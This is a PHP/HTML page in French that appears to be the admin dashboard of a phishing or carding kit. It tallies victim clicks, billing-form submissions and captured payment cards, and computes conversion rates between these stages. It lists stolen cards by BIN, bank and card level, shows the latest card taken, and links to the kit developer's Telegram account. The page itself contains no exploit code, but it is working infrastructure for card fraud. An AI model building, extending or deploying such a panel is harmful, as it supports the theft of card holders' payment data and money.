<?php

declare(strict_types=1);

require_once __DIR__ . '/bootstrap.php';

panel_require_page_auth();

header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');

?>
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <meta name="color-scheme" content="dark" />
  <title>Panel — Statistiques</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="css/panel.css" />
</head>
<body>
  <div class="panel-shell">
    <header class="panel-top">
      <a
        href="https://t.me/iblisV2"
        class="panel-dev-link"
        target="_blank"
        rel="noopener noreferrer"
        title="Contacter le dev sur Telegram"
      >
        <span class="panel-dev-link__label">Dev</span>
        @iblisV2
      </a>
      <button type="button" class="panel-btn panel-btn--primary panel-btn--compact panel-logout--header" id="panel-logout">
        Déconnexion
      </button>
    </header>

    <main class="panel-main" id="panel-dashboard">
      <section class="panel-kpis panel-stagger" aria-label="Indicateurs principaux">
        <article class="panel-kpi panel-kpi--clicks" data-accent="#64b5f6">
          <p class="panel-kpi__label">Clics</p>
          <p class="panel-kpi__value" data-stat="clicks">0</p>
        </article>
        <article class="panel-kpi panel-kpi--billing" data-accent="#ffb300">
          <p class="panel-kpi__label">Billing</p>
          <p class="panel-kpi__value" data-stat="billing">0</p>
        </article>
        <article class="panel-kpi panel-kpi--cartes" data-accent="#00e676">
          <p class="panel-kpi__label">CARTES</p>
          <p class="panel-kpi__value" data-stat="cartes">0</p>
        </article>
      </section>

      <section class="panel-section panel-section--wide panel-card-interactive panel-stagger" data-accent="#00e676">
        <h2 class="panel-section__title">Taux de conversion</h2>
        <div class="panel-bars">
          <div class="panel-bar panel-bar-interactive">
            <div class="panel-bar__head">
              <span class="panel-bar__label">Clic → Billing</span>
              <span class="panel-bar__pct" data-conv="click_billing">0 %</span>
            </div>
            <div class="panel-bar__track"><span class="panel-bar__fill" data-conv="click_billing" style="width: 0"></span></div>
          </div>
          <div class="panel-bar panel-bar-interactive">
            <div class="panel-bar__head">
              <span class="panel-bar__label">Billing → Cartes</span>
              <span class="panel-bar__pct" data-conv="billing_cartes">0 %</span>
            </div>
            <div class="panel-bar__track"><span class="panel-bar__fill" data-conv="billing_cartes" style="width: 0"></span></div>
          </div>
          <div class="panel-bar panel-bar-interactive">
            <div class="panel-bar__head">
              <span class="panel-bar__label">Clic → Cartes</span>
              <span class="panel-bar__pct" data-conv="click_cartes">0 %</span>
            </div>
            <div class="panel-bar__track"><span class="panel-bar__fill" data-conv="click_cartes" style="width: 0"></span></div>
          </div>
        </div>
      </section>

      <div class="panel-columns">
        <section class="panel-section panel-section--cards panel-card-interactive" data-accent="#00e676">
          <div class="panel-section__head">
            <h2 class="panel-section__title">Cartes</h2>
            <span class="panel-section__count" data-cards-count>0</span>
          </div>
          <div class="panel-cards-scroll">
            <div class="panel-cards-header" aria-hidden="true">
              <span>BIN</span>
              <span>Âge</span>
              <span>Banque</span>
              <span>Level</span>
            </div>
            <ul class="panel-cards-list" id="panel-cards-list"></ul>
          </div>
          <ul class="panel-meta-list">
            <li>
              <span class="panel-meta-list__label">Visiteurs uniques (aujourd'hui)</span>
              <span class="panel-meta-list__value" data-unique-today>0</span>
            </li>
            <li>
              <span class="panel-meta-list__label">Dernière carte</span>
              <span class="panel-meta-list__value" data-last-card>—</span>
            </li>
          </ul>
        </section>

        <section class="panel-section panel-section--chart panel-card-interactive" data-accent="#00e676">
          <h2 class="panel-section__title">Répartition des clics</h2>
          <div class="panel-pie-wrap" id="panel-pie-wrap">
            <svg class="panel-pie-svg" viewBox="0 0 220 220" aria-hidden="true"></svg>
            <div class="panel-pie__center" id="panel-pie-center">
              <span id="panel-pie-total">0</span>
              <small id="panel-pie-center-label">clics</small>
            </div>
            <div class="panel-pie-tooltip" id="panel-pie-tooltip" hidden></div>
          </div>
          <ul class="panel-legend" id="panel-pie-legend">
            <li data-segment="cartes">
              <span class="panel-legend__dot panel-legend__dot--cartes"></span>
              <span class="panel-legend__label">Cartes</span>
              <span class="panel-legend__value">0</span>
            </li>
            <li data-segment="billing">
              <span class="panel-legend__dot panel-legend__dot--billing"></span>
              <span class="panel-legend__label">Billing</span>
              <span class="panel-legend__value">0</span>
            </li>
            <li data-segment="clics">
              <span class="panel-legend__dot panel-legend__dot--clics"></span>
              <span class="panel-legend__label">Clics seuls</span>
              <span class="panel-legend__value">0</span>
            </li>
          </ul>
        </section>
      </div>
    </main>

    <footer class="panel-bottom">
      <button type="button" class="panel-btn panel-btn--danger panel-reset" id="panel-reset">
        Réinitialiser les statistiques
      </button>
      <button type="button" class="panel-btn panel-btn--primary panel-logout--mobile" id="panel-logout-mobile">
        Déconnexion
      </button>
    </footer>
  </div>

  <script src="js/panel.js"></script>
  <script>
    panelBootDashboard();
  </script>
</body>
</html>
